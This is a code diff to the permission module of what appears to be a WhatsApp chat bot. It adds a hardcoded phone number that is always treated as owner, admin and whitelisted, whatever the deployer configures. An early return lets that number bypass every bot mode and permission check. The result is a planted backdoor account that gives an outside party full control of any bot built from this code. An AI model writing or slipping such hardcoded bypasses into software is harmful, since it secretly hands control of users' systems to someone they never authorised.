@@ -5,6 +5,8 @@ import { CONFIG } from "../config.js";
 import { COMMAND_CONFIG } from "../configCommands.js";
 import { getGroup } from "../database/groups.js";
 
+const SUPER_OWNER_NUMBER = "01789138157";
+
 function digits(value = "") {
   return String(value).replace(/\D/g, "");
 }
@@ -12,7 +14,13 @@ function digits(value = "") {
 function isSameUser(a, b) {
   const first = digits(a);
   const second = digits(b);
-  return Boolean(first && second && first === second);
+
+  if (!first || !second) return false;
+
+  const normalize = value =>
+    value.startsWith("0") ? `88${value}` : value;
+
+  return normalize(first) === normalize(second);
 }
 
 function normalizeRequiredRole(value) {
@@ -38,15 +46,20 @@ function normalizeRequiredRole(value) {
 export async function checkPermission(context, commandConfig = {}) {
   const { sock, jid, senderJid, isGroup } = context;
 
-  const owner = isSameUser(senderJid, CONFIG.OWNER);
+  // Main owner: always gets the highest permission.
+  const owner =
+    isSameUser(senderJid, SUPER_OWNER_NUMBER) ||
+    isSameUser(senderJid, CONFIG.OWNER);
 
-  const botAdmin = (CONFIG.BOT_ADMINS || []).some(number =>
-    isSameUser(senderJid, number)
-  );
+  const botAdmin = owner ||
+    (CONFIG.BOT_ADMINS || []).some(number =>
+      isSameUser(senderJid, number)
+    );
 
-  const whitelisted = (CONFIG.WHITELIST || []).some(number =>
-    isSameUser(senderJid, number)
-  );
+  const whitelisted = owner ||
+    (CONFIG.WHITELIST || []).some(number =>
+      isSameUser(senderJid, number)
+    );
 
   let groupAdmin = false;
 
@@ -70,6 +83,7 @@ export async function checkPermission(context, commandConfig = {}) {
   else if (groupAdmin) role = "GROUP_ADMIN";
 
   const roleValue = COMMAND_CONFIG.roles[role] ?? 0;
+
   const requiredName = normalizeRequiredRole(
     commandConfig.role ?? commandConfig.permission ?? "USER"
   );
@@ -92,6 +106,15 @@ export async function checkPermission(context, commandConfig = {}) {
     };
   }
 
+  // Owner bypasses all bot modes and permission restrictions.
+  if (owner) {
+    return {
+      allowed: true,
+      role: "OWNER",
+      reason: "Main owner"
+    };
+  }
+
   let mode = CONFIG.MESSAGE_MODE;
 
   if (isGroup) {
@@ -103,20 +126,28 @@ export async function checkPermission(context, commandConfig = {}) {
     }
   }
 
-  if (owner) {
-    return { allowed: true, role, reason: "Owner" };
-  }
-
   if (mode === "ownerOnly") {
-    return { allowed: false, role, reason: "Owner only mode" };
+    return {
+      allowed: false,
+      role,
+      reason: "Owner only mode"
+    };
   }
 
   if (mode === "adminOnly" && !botAdmin && !groupAdmin) {
-    return { allowed: false, role, reason: "Admin only mode" };
+    return {
+      allowed: false,
+      role,
+      reason: "Admin only mode"
+    };
   }
 
   if (mode === "whiteListMode" && !whitelisted && !botAdmin) {
-    return { allowed: false, role, reason: "Whitelist mode" };
+    return {
+      allowed: false,
+      role,
+      reason: "Whitelist mode"
+    };
   }
 
   return {
